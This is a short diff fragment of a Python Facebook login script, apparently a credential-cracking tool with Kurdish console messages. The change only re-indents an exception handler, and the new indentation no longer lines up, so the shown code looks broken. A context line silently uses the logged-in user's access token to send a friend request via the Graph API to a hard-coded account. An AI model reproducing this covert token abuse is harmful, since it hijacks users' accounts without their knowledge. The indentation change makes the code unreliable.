@@ -139,7 +139,7 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				time.sleep(2)
 				menu()
-	        except requests.exceptions.ConnectionError:
+	         except requests.exceptions.ConnectionError:
 				print("\n\x1b[33;1m    [%]® XATAKAT XAWA BIGORA\x1b[0m")
 				kelwa()
 		if 'checkpoint' in url:
